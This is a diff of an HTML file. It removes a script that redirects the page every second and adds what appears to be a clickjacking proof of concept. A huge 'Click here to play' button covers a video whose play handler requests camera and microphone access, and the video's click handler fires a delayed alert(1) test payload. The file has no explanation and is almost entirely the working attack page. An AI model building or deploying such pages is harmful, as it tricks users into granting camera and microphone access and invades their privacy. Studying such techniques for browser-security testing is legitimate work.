@@ -1,8 +1,41 @@
-<script>
-function f()
-{
-location = "https://www.google.com:83"
-}
-setInterval("f()", 1000);
-</script>
+<!DOCTYPE html> 
+<html> 
+<body> 
+<div>
+<video onplay="p()" onclick="setTimeout('alert(1)',1000)" width="1000" height="2000" style="" controls>
+  <source src="https://cdn.glitch.global/6e8fbc6b-c3ff-4707-96d6-d3d3679d4576/clk.mp4?v=1723066642894" type="video/mp4">
+  <!--<source src="mov_bbb.ogg" type="video/ogg">-->
+  Your browser does not support HTML video.
+</video>
+</div>
+<div style="margin-top:-140%">
+  <button style="width:100%;height:500px;font-size:100px" >
+    Click here to play
+  </button>
+  
+  </div>
+
+</body> 
 </html>
+<script>
+
+ function p(){
+  
+   navigator.mediaDevices ?
+        navigator.mediaDevices.getUserMedia(
+          {audio: true, video: true}).then(
+           
+        ) :
+        navigator.getUserMedia(
+          {audio: true, video: true},
+         
+        );
+
+     
+
+
+    
+  }
+
+
+</script>
